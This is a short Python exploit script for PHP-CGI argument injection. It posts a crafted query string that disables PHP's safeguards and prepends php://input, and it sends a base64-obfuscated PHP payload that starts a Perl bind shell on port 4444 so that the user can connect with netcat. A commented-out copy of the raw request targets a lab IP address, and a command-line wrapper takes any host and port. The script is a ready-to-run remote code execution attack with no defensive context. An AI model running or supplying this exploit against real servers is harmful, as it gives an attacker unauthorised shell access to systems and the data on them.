# import requests
# burp0_url = "http://192.168.56.108:80/?--define+allow_url_include%3doN+--define+safe_mode%3d0+-%64+suhosin.simulation%3d1+-d+disable_functions%3d%22%22+-%64+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+--define+cgi.force_redirect%3d0+--define+cgi.redirect_status_env%3d0+-n"
# burp0_headers = {"POST /?--define+allow_url_include%3doN+--define+safe_mode%3d0+-%64+suhosin.simulation%3d1+-d+disable_functions%3d%22%22+-%64+open_basedir%3dnone+--define+auto_prepend_file%3dphp": "/input+--define+cgi.force_redirect%3d0+--define+cgi.redirect_status_env%3d0+-n HTTP/1.1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
# burp0_data = b"<?php system(base64_decode('cGVybCAtTUlPIC1lICckcD1mb3JrKCk7ZXhpdCxpZiRwOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0NDQ0LFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTtzeXN0ZW0kXyB3aGlsZTw+Jw=='));"
# requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


import click
from requests import post
import base64



def send_request(host, rport):
    url = f"http://{host}:{rport}/?--define+allow_url_include%3doN+--define+safe_mode%3d0+-%64+suhosin.simulation%3d1+-d+disable_functions%3d%22%22+-%64+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+--define+cgi.force_redirect%3d0+--define+cgi.redirect_status_env%3d0+-n"
    headers = {"POST /?--define+allow_url_include%3doN+--define+safe_mode%3d0+-%64+suhosin.simulation%3d1+-d+disable_functions%3d%22%22+-%64+open_basedir%3dnone+--define+auto_prepend_file%3dphp": "/input+--define+cgi.force_redirect%3d0+--define+cgi.redirect_status_env%3d0+-n HTTP/1.1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    data ="<?php system(base64_decode('cGVybCAtTUlPIC1lICckcD1mb3JrKCk7ZXhpdCxpZiRwOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0NDQ0LFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTtzeXN0ZW0kXyB3aGlsZTw+Jw=='));"
    
    try:
        post(url, headers=headers, data=data)
        print("[+] Check netcat")
    except:
        print("[-] Failed ")

@click.command()
@click.option("--host", help="The host Ip address example: xxx.xxx.xxx.xxx")
@click.option("--rport", default=80, help="The port number [default: 80]  ")
def main(host, rport):
    """
        TRY Hader
    """
    """
        nc host lport
    """

    if not host: 
        print("help: python filename.py --help")
    
        return None

    send_request(host, rport) 

if __name__ == "__main__":
    main()

    
